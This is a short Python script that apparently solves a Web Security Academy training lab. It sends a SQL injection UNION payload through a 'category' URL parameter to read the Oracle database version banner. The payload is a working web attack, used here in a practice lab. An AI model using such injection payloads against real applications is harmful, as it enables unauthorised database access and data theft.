import requests
from colorama import Fore
import re

#Make the database retrieve the strings: 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production,
#PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'

LAB_URL="https://0add00ed0422674e825e47fb006400eb.web-security-academy.net"

def main():
    print("[1] Injection parameter: " + Fore.YELLOW + "category")
    payload = "1'UNION+SELECT+null,banner+FROM+v$version--"
    injection= fetch(f"/filter?category={payload}")

def fetch(path, cookies = None):
    try:
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=True)
    except:
        print(Fore.RED + "[!] Failed to fetch: " + LAB_URL + path) 
    

if __name__ == "__main__":
    main()


